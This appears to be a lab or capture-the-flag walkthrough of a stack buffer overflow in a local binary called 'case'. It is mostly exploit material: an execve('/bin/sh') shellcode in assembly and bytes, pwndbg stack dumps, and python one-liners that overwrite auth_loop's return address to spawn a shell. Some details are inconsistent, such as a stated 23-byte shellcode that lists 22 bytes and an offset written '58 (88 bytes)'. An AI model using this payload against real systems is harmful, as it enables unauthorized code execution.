1st to open the gdb withthe pwndgb we have to deactivate the autoupdate.
As we can't tmodify the file source /opt/pwndbg/gdbinit.py the best way is:
PWNDBG_NO_AUTOUPDATE=1 gdb ./case
Into case.c we find the following lines:
"""
    printf("[SPRAWL//NET] Session %d initialized\n", sid);
    printf("[SPRAWL//NET] Enter credentials: ");
    fflush(stdout);

    gets(credentials);

    log_attempt(credentials, verify_credentials(credentials));
"""
The idea consists in injeting the code in the position where return of the function auth_loop is

for that I create the binary code of a shell program:
vim test.asm 
---
section .test
global _start

_start:
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        push 0x3b
        pop rax
        cdq
        syscall      
---

nasm -f elf64 test.asm -o test.oobjdump -d test.o 
objdump -d test.o

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	31 f6                	xor    %esi,%esi
   2:	56                   	push   %rsi
   3:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
   a:	2f 73 68 
   d:	53                   	push   %rbx
   e:	54                   	push   %rsp
   f:	5f                   	pop    %rdi
  10:	6a 3b                	push   $0x3b
  12:	58                   	pop    %rax
  13:	99                   	cltd   
  14:	0f 05                	syscall 
  
  The code to inject shell is (23 byte long)
  \x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05
  
PWNDBG_NO_AUTOUPDATE=1 gdb ./case
b *0x000000000040159b  (para despues del get)
run
excribe AAAAAAAAAAAAAAAABBBBBBBB

(pwndbg) p $rbp-0x50
$1 = (void *) 0x7fffffffe1d0
(pwndbg) x/40gx $rbp-0x50
0x7fffffffe1d0:	0x4141414141414141	0x4241414141414141
0x7fffffffe1e0:	0x0042424242424242	0x00007fffffffe358
0x7fffffffe1f0:	0x0000000000000001	0x0000000000000000
0x7fffffffe200:	0x0000000000403e00	0x00007ffff7ffd000
0x7fffffffe210:	0x00007fffffffe220	0x00000000004014b7
0x7fffffffe220:	0x00007fffffffe230	0x0000000000401648
0x7fffffffe230:	0x00007fffffffe2d0	0x00007ffff7c2a1ca
0x7fffffffe240:	0x00007fffffffe280	0x00007fffffffe358
0x7fffffffe250:	0x0000000100400040	0x0000000000401631
0x7fffffffe260:	0x00007fffffffe358	0xba9b4cf6eb4db611
0x7fffffffe270:	0x0000000000000001	0x0000000000000000
0x7fffffffe280:	0x0000000000403e00	0x00007ffff7ffd000
0x7fffffffe290:	0xba9b4cf6ea6db611	0xba9b5c8c6defb611
0x7fffffffe2a0:	0x00007fff00000000	0x0000000000000000
0x7fffffffe2b0:	0x0000000000000000	0x0000000000000001
0x7fffffffe2c0:	0x00007fffffffe350	0x4c535d71b689ec00
0x7fffffffe2d0:	0x00007fffffffe330	0x00007ffff7c2a28b
0x7fffffffe2e0:	0x00007fffffffe368	0x0000000000403e00
0x7fffffffe2f0:	0x00007fffffffe368	0x0000000000401631
0x7fffffffe300:	0x0000000000000000	0x0000000000000000

the return of the auth_loop is in 0x7fffffffe228
the quantity of bytes to inject the code jost in return is: 0x7fffffffe228 - 0x7fffffffe1d0 = 58 (88 bytes)
we have to print:  
(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*66 + b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + b"\x20\xe2\xff\xff\xff\x7f")' ; cat) | ./case
(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*66 + b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + b"\xf0\xe1\xff\xff\xff\x7f")' ; cat) | ./case

